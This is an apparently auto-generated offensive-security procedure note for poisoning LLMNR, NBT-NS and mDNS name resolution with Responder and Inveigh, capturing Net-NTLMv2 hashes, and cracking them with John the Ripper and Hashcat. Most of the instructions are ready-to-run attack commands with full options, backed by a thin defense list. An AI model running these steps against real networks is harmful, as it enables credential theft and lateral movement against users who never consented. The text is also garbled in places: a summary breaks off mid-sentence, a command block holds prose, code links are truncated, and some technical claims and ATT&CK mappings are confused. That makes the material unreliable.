---
id: eff67b48-363f-4763-8d90-3b13694c77ba
name: Net-NTLMv2/NTLMv2 Hash Capture and Cracking
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:05.254078+00:00'
updated_at: '2023-04-10T20:36:07.553009+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
- '[[Pass the Hash|T1075 - Pass the Hash]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Capturing and cracking Net-NTLMv2/NTLMv2 hashes]]'
commands:
- '[[Check NetBIOS Name]]'
- '[[Hashcat: Crack netNTLMv2 Hashes]]'
- '[[Install MDNS]]'
- '[[InveighZero.exe with options -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts
  Y -DHCPv6 Y -LLMNRv6 Y]]'
- '[[Invoke-Inveigh.ps1 with options -IP ''10.10.10.10'' -ConsoleOutput Y -FileOutput
  Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y]]'
- '[[John the Ripper: netNTLMv2 Hash Format]]'
- '[[LLMNR]]'
- '[[Responder.py with options -I eth0 -wfrd -P -v]]'
---

# Net-NTLMv2/NTLMv2 Hash Capture and Cracking

## Summary

Capturing and cracking Net-NTLMv2/NTLMv2 hashes is a common technique used by attackers to gain access to a target network. This technique involves capturing the hashes of users' passwords as they are sent over the network, and then using tools like John the Ripper or Hashcat to crack them. Once an

## Description

# Description

Capturing and cracking Net-NTLMv2/NTLMv2 hashes is a common technique used by attackers to gain access to a target network. This technique involves capturing the hashes of users' passwords as they are sent over the network, and then using tools like John the Ripper or Hashcat to crack them. Once an attacker has access to a user's password, they can use it to gain access to the network and move laterally to other systems.

Technical Explanation: When a user logs into a Windows machine, their password is hashed and sent to the domain controller for authentication. The hash is then stored in memory on the user's machine, and is also sent over the network to other machines that the user accesses. Attackers can use tools like Responder or Inveigh to intercept these hash values as they are sent over the network. Once the hashes have been captured, they can be cracked using password cracking tools like John the Ripper or Hashcat.

Business Value: By capturing and cracking Net-NTLMv2/NTLMv2 hashes, attackers can gain access to sensitive information and systems within an organization. This can lead to data theft, financial loss, and reputational damage.

 

## Requirements

1. Access to the target network

1. Tools for capturing and cracking hashes, such as Responder, Inveigh, John the Ripper, or Hashcat

 

## Defense

1. Use strong, unique passwords for all user accounts

1. Implement two-factor authentication to prevent attackers from using stolen credentials

1. Monitor network traffic for signs of hash capturing and cracking activity

 

## Objectives

1. Capture Net-NTLMv2/NTLMv2 hashes sent over the network

1. Crack captured hashes to obtain user passwords

1. Use obtained credentials to gain access to network resources

 

# Instructions

1. To perform LLMNR poisoning and credential theft, use a tool like Responder. Run Responder on the network and wait for a user to mistype a machine name or IP address. Responder will answer for the request and ask for the user's NTLMv2 hash, which can be used to access the resource the user was trying to reach.

 



**Code**: [[LLMNR]]



> LLMNR is a protocol used to resolve names to IP addresses in a local network when DNS is not available. By default, Windows machines have LLMNR enabled, which makes them vulnerable to LLMNR poisoning attacks. Attackers can use tools like Responder to respond to LLMNR requests and trick users into sending their NTLMv2 hash, which can be used to access resources on the network. It is important to disable LLMNR on all machines in the network to prevent this type of attack.



**Command** ([[LLMNR]]):

```bash
LLMNR is a protocol that allows both IPv4 and IPv6 hosts to perform name resolution for hosts on the same local link. It is included in Windows Vista, Windows Server 2008, Windows 7, Windows Server 2008 R2, Windows 8, and Windows Server 2012.
```



2. Run the following command to discover devices on the local network using mDNS protocol:

 



**Code**: [[MDNS]]



> This command will scan the local network for devices that are advertising their services using mDNS protocol. The output will include the IP addresses and hostnames of the discovered devices. Use this command to discover devices on the local network that are not necessarily connected to the internet, such as printers, smart home devices, and other IoT devices.



**Command** ([[Install MDNS]]):

```bash
sudo apt-get install libnss-mdns
```



3. nbtstat -a [IP address or hostname]

 



**Code**: [[NETBIOS]]



> This command is used to display the NetBIOS name table of a remote computer, along with the IP address and type of each entry. It can also be used to troubleshoot NetBIOS name resolution issues by querying a specific NetBIOS name and displaying the corresponding IP address. The -a option is used to display all the NetBIOS names registered on the remote computer.



**Command** ([[Check NetBIOS Name]]):

```bash
nbtstat -a 192.168.1.100
```



4. Use these commands to perform network sniffing and spoofing attacks. The commands include:
1. Responder.py: A LLMNR, NBT-NS, and MDNS poisoner
2. InveighZero: A PowerShell LLMNR/mDNS/NBNS spoofer/man-in-the-middle tool
3. Invoke-Inveigh: A PowerShell LLMNR/mDNS/NBNS spoofer/man-in-the-middle tool

To use these commands, follow the instructions below:
- For Responder.py:
	- Run the following command: sudo ./Responder.py -I eth0 -wfrd -P -v
- For InveighZero:
	- Run the following command in PowerShell: .\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]
- For Invoke-Inveigh:
	- Run the following command in PowerShell: Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y

 



**Code**: [[# https://github.com/lgandx/Responder
$ sudo ./Res]]



> The commands mentioned above are used for network sniffing and spoofing attacks. These attacks can be used to intercept network traffic and steal sensitive information. Responder.py is a tool that can be used to poison LLMNR, NBT-NS, and MDNS protocols. InveighZero and Invoke-Inveigh are PowerShell tools that can be used to spoof LLMNR, mDNS, and NBNS protocols. These tools can also be used to perform man-in-the-middle attacks on the network traffic. It is important to note that these tools should be used for ethical purposes only and with proper authorization.



**Command** ([[Responder.py with options -I eth0 -wfrd -P -v]]):

```bash
$ sudo ./Responder.py -I eth0 -wfrd -P -v
```





**Command** ([[InveighZero.exe with options -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y]]):

```powershell
PS > .\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]
```





**Command** ([[Invoke-Inveigh.ps1 with options -IP '10.10.10.10' -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y]]):

```powershell
PS > Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
```



5. To crack the NTLMv2 hash using John The Ripper and Hashcat, follow these steps:
1. Save the hash in a file named hash.txt
2. Open a command prompt and navigate to the directory containing the hash.txt file
3. Run the following command to crack the hash using John The Ripper: john --format=netntlmv2 hash.txt
4. Once the cracking is complete, run the following command to crack the hash using Hashcat: hashcat -m 5600 -a 3 hash.txt
Note: The above commands assume that John The Ripper and Hashcat are installed on the system.

 



**Code**: [[john --format=netntlmv2 hash.txt
hashcat -m 5600 -]]



> The 'john' command is used to crack the NTLMv2 hash using John The Ripper tool. The '--format=netntlmv2' argument specifies the format of the hash to be cracked. The 'hash.txt' argument specifies the file containing the hash to be cracked.
The 'hashcat' command is used to crack the hash using Hashcat tool. The '-m 5600' argument specifies the hash mode to be used. The '-a 3' argument specifies the attack mode to be used. The 'hash.txt' argument specifies the file containing the hash to be cracked.



**Command** ([[John the Ripper: netNTLMv2 Hash Format]]):

```bash
john --format=netntlmv2 hash.txt
```





**Command** ([[Hashcat: Crack netNTLMv2 Hashes]]):

```bash
hashcat -m 5600 -a 3 hash.txt
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]
- [[Pass the Hash|T1075 - Pass the Hash]]

## Commands Used

- [[Check NetBIOS Name]]
- [[Hashcat: Crack netNTLMv2 Hashes]]
- [[Install MDNS]]
- [[InveighZero.exe with options -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y]]
- [[Invoke-Inveigh.ps1 with options -IP '10.10.10.10' -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y]]
- [[John the Ripper: netNTLMv2 Hash Format]]
- [[LLMNR]]
- [[Responder.py with options -I eth0 -wfrd -P -v]]

## Tags

- [[Active Directory Attacks]]
- [[Capturing and cracking Net-NTLMv2/NTLMv2 hashes]]


